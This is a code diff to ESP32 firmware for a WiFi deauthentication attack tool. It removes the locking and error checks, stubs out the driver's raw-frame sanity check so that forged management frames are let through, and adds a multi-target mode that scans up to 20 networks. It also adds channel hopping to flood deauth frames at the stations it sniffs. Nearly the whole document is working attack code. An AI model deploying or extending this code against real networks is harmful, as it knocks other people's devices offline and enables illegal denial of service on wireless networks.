@@ -1,7 +1,5 @@
 #include <WiFi.h>
 #include <esp_wifi.h>
-#include "freertos/FreeRTOS.h"
-#include "freertos/semphr.h"
 #include "types.h"
 #include "deauth.h"
 #include "definitions.h"
@@ -10,17 +8,11 @@ deauth_frame_t deauth_frame;
 int deauth_type = DEAUTH_TYPE_SINGLE;
 int eliminated_stations;
 
-static SemaphoreHandle_t wifi_mutex = nullptr;
+bool selected_networks[20];
+int selected_count = 0;
 
-static void wifi_lock() {
-  if (!wifi_mutex) {
-    wifi_mutex = xSemaphoreCreateMutex();
-  }
-  if (wifi_mutex) xSemaphoreTake(wifi_mutex, portMAX_DELAY);
-}
-
-static void wifi_unlock() {
-  if (wifi_mutex) xSemaphoreGive(wifi_mutex);
+extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
+  return 0;
 }
 
 esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);
@@ -36,26 +28,26 @@ IRAM_ATTR void sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
 
   if (deauth_type == DEAUTH_TYPE_SINGLE) {
     if (memcmp(mac_header->dest, deauth_frame.sender, 6) == 0) {
-      wifi_lock();
       memcpy(deauth_frame.station, mac_header->src, 6);
-      for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++) {
-        esp_err_t r = esp_wifi_80211_tx(WIFI_IF_AP, &deauth_frame, sizeof(deauth_frame), false);
-        if (r != ESP_OK) DEBUG_PRINTF("esp_wifi_80211_tx error: %d\n", r);
-      }
+      for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++) esp_wifi_80211_tx(WIFI_IF_AP, &deauth_frame, sizeof(deauth_frame), false);
       eliminated_stations++;
-      wifi_unlock();
     } else return;
+  } else if (deauth_type == DEAUTH_TYPE_MULTI) {
+    for (int i = 0; i < selected_count; i++) {
+      if (selected_networks[i] && memcmp(mac_header->dest, deauth_frame.sender, 6) == 0) {
+        memcpy(deauth_frame.station, mac_header->src, 6);
+        for (int j = 0; j < NUM_FRAMES_PER_DEAUTH; j++) esp_wifi_80211_tx(WIFI_IF_AP, &deauth_frame, sizeof(deauth_frame), false);
+        eliminated_stations++;
+        break;
+      }
+    }
   } else {
     if ((memcmp(mac_header->dest, mac_header->bssid, 6) == 0) && (memcmp(mac_header->dest, "\xFF\xFF\xFF\xFF\xFF\xFF", 6) != 0)) {
-      wifi_lock();
       memcpy(deauth_frame.station, mac_header->src, 6);
       memcpy(deauth_frame.access_point, mac_header->dest, 6);
       memcpy(deauth_frame.sender, mac_header->dest, 6);
-      for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++) {
-        esp_err_t r = esp_wifi_80211_tx(WIFI_IF_STA, &deauth_frame, sizeof(deauth_frame), false);
-        if (r != ESP_OK) DEBUG_PRINTF("esp_wifi_80211_tx error: %d\n", r);
-      }
-      wifi_unlock();
+      for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++) esp_wifi_80211_tx(WIFI_IF_STA, &deauth_frame, sizeof(deauth_frame), false);
+      eliminated_stations++;
     } else return;
   }
 
@@ -68,8 +60,8 @@ void start_deauth(int wifi_number, int attack_type, uint16_t reason) {
   deauth_type = attack_type;
 
   deauth_frame.reason = reason;
-
-  wifi_lock();
+  memset(selected_networks, 0, sizeof(selected_networks));
+  selected_count = 0;
 
   if (deauth_type == DEAUTH_TYPE_SINGLE) {
     DEBUG_PRINT("Starting Deauth-Attack on network: ");
@@ -77,27 +69,45 @@ void start_deauth(int wifi_number, int attack_type, uint16_t reason) {
     WiFi.softAP(AP_SSID, AP_PASS, WiFi.channel(wifi_number));
     memcpy(deauth_frame.access_point, WiFi.BSSID(wifi_number), 6);
     memcpy(deauth_frame.sender, WiFi.BSSID(wifi_number), 6);
+  } else if (deauth_type == DEAUTH_TYPE_MULTI) {
+    DEBUG_PRINTLN("Starting Multi-Target Deauth on selected networks!");
+    int num = WiFi.scanNetworks();
+    if (num > 0) {
+      if (num > 20) num = 20;
+      for (int i = 0; i < num; i++) {
+        selected_networks[i] = true;
+        selected_count++;
+      }
+      memcpy(deauth_frame.access_point, WiFi.BSSID(0), 6);
+      memcpy(deauth_frame.sender, WiFi.BSSID(0), 6);
+      WiFi.softAP(AP_SSID, AP_PASS, WiFi.channel(0));
+    }
   } else {
     DEBUG_PRINTLN("Starting Deauth-Attack on all detected stations!");
     WiFi.softAPdisconnect();
     WiFi.mode(WIFI_MODE_STA);
   }
 
-  esp_err_t err;
-  err = esp_wifi_set_promiscuous(true);
-  if (err != ESP_OK) DEBUG_PRINTF("esp_wifi_set_promiscuous error: %d\n", err);
-  err = esp_wifi_set_promiscuous_filter(&filt);
-  if (err != ESP_OK) DEBUG_PRINTF("esp_wifi_set_promiscuous_filter error: %d\n", err);
-  err = esp_wifi_set_promiscuous_rx_cb(&sniffer);
-  if (err != ESP_OK) DEBUG_PRINTF("esp_wifi_set_promiscuous_rx_cb error: %d\n", err);
-
-  wifi_unlock();
+  esp_wifi_set_promiscuous(true);
+  esp_wifi_set_promiscuous_filter(&filt);
+  esp_wifi_set_promiscuous_rx_cb(&sniffer);
 }
 
 void stop_deauth() {
   DEBUG_PRINTLN("Stopping Deauth-Attack..");
-  wifi_lock();
-  esp_err_t err = esp_wifi_set_promiscuous(false);
-  if (err != ESP_OK) DEBUG_PRINTF("esp_wifi_set_promiscuous(false) error: %d\n", err);
-  wifi_unlock();
+  esp_wifi_set_promiscuous(false);
+  WiFi.softAP(AP_SSID, AP_PASS);
+}
+
+unsigned long last_hop = 0;
+int current_channel = 1;
+
+void handle_channel_hopping() {
+  if (deauth_type != DEAUTH_TYPE_MULTI && deauth_type != DEAUTH_TYPE_ALL) return;
+  if (millis() - last_hop > 200) {
+    current_channel++;
+    if (current_channel > 13) current_channel = 1;
+    esp_wifi_set_channel(current_channel, WIFI_SECOND_CHAN_NONE);
+    last_hop = millis();
+  }
 }
